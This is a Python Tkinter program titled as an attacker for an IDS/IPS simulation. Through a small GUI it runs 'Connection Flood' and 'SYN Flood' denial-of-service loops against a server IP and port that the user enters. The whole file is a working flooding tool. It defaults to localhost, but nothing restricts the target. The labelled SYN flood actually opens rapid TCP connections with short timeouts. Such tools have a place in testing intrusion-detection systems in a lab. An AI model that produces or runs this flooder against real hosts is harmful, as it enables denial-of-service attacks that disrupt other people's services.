import socket
import threading
from tkinter import *
from tkinter import ttk, messagebox

# Global variable to track attack state
attacking = False
client_socket = None

# Function to connect to the server
def connect_server():
    global client_socket
    server_ip = server_ip_entry.get()
    server_port = int(server_port_entry.get())
    
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((server_ip, server_port))
        connect_button.config(state=DISABLED)
        disconnect_button.config(state=NORMAL)
        messagebox.showinfo("Connection", "Connected to the server!")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to connect to server: {e}")

# Function to disconnect from the server
def disconnect_server():
    global client_socket
    try:
        if client_socket:
            client_socket.close()
            connect_button.config(state=NORMAL)
            disconnect_button.config(state=DISABLED)
            messagebox.showinfo("Connection", "Disconnected from the server!")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to disconnect: {e}")

# Function to start attacking the server
def start_attack():
    global attacking
    if not attacking:
        attack_type = attack_combobox.get()
        attacking = True
        threading.Thread(target=attack_server, args=(attack_type,)).start()
        start_attack_button.config(state=DISABLED)
        stop_attack_button.config(state=NORMAL)

# Function to stop the attack
def stop_attack():
    global attacking
    attacking = False
    start_attack_button.config(state=NORMAL)
    stop_attack_button.config(state=DISABLED)

# Function to perform different types of attacks
def attack_server(attack_type):
    global attacking
    server_ip = server_ip_entry.get()
    server_port = int(server_port_entry.get())

    try:
        if attack_type == "Connection Flood":
            while attacking:
                try:
                    attack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    attack_socket.connect((server_ip, server_port))
                    attack_socket.close()
                except Exception:
                    pass
        elif attack_type == "SYN Flood":
            while attacking:
                try:
                    # SYN flood attack simulation by sending incomplete connection requests
                    attack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    attack_socket.settimeout(0.01)
                    attack_socket.connect_ex((server_ip, server_port))
                    attack_socket.close()
                except Exception:
                    pass
        messagebox.showinfo("Attack", f"{attack_type} attack completed!")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to perform attack: {e}")

# GUI Setup for Attacker Management
root = Tk()
root.title("Attacker of IDS and IPS Simulation")
root.geometry("400x300")

# Server IP and Port Inputs
Label(root, text="Server IP:").pack(pady=5)
server_ip_entry = Entry(root, width=30)
server_ip_entry.pack(pady=5)
server_ip_entry.insert(0, "127.0.0.1")  # Default IP for local testing

Label(root, text="Server Port:").pack(pady=5)
server_port_entry = Entry(root, width=30)
server_port_entry.pack(pady=5)
server_port_entry.insert(0, "12345")  # Default port

# Connect and Disconnect buttons
connect_button = Button(root, text="Connect to Server", command=connect_server)
connect_button.pack(pady=10)

disconnect_button = Button(root, text="Disconnect from Server", command=disconnect_server, state=DISABLED)
disconnect_button.pack(pady=5)

# Attack type selection
Label(root, text="Select Attack Type:").pack(pady=5)
attack_combobox = ttk.Combobox(root, values=["Connection Flood", "SYN Flood"], state="readonly")
attack_combobox.pack(pady=5)
attack_combobox.current(0)

# Start and Stop Attack buttons
start_attack_button = Button(root, text="Start Attack", command=start_attack)
start_attack_button.pack(pady=10)

stop_attack_button = Button(root, text="Stop Attack", command=stop_attack, state=DISABLED)
stop_attack_button.pack(pady=5)

# Run the Tkinter event loop
root.mainloop()
